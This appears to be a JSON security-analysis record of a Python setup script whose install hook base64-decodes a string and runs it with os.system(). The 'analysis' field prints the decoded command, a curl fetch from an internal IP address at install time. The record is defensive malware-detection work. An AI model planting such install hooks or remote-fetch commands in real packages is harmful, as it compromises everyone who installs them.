{
  "purpose": "The code defines a setup script for a Python package that includes a potentially malicious post-installation behavior, specifically executing base64-decoded code during installation.",
  "sources": "The base64-encoded string within the notmalfunc() function, which is decoded and executed during the install process.",
  "sinks": "os.system() call executing decoded code, which could run arbitrary commands or scripts.",
  "flows": "The package installation triggers the AfterInstall.run() method, which calls notmalfunc(), decoding a base64 string and executing it via os.system().",
  "anomalies": "Use of base64 decoding and os.system() to execute decoded code at install time; the base64 string appears to encode a URL or command, indicating potentially malicious behavior. The purpose of executing arbitrary code during package installation is suspicious.",
  "analysis": "The script imports setuptools and defines custom classes inheriting from install and develop commands, adding a function 'notmalfunc()' that decodes a base64 string and executes it via os.system(). The base64 string decodes to 'curl -s http://192.168.1.3:8000/test.txt | base', suggesting the code attempts to download and possibly execute or process content from an external server. The setup() function includes this behavior in the AfterInstall class, which runs during package installation. This pattern is characteristic of malicious supply chain behavior, as it fetches and potentially executes remote code during setup.",
  "conclusion": "The code contains malicious behavior by executing a remote URL command during package installation, indicating a supply chain attack. The use of base64 decoding and os.system() for executing external commands strongly suggests malicious intent.",
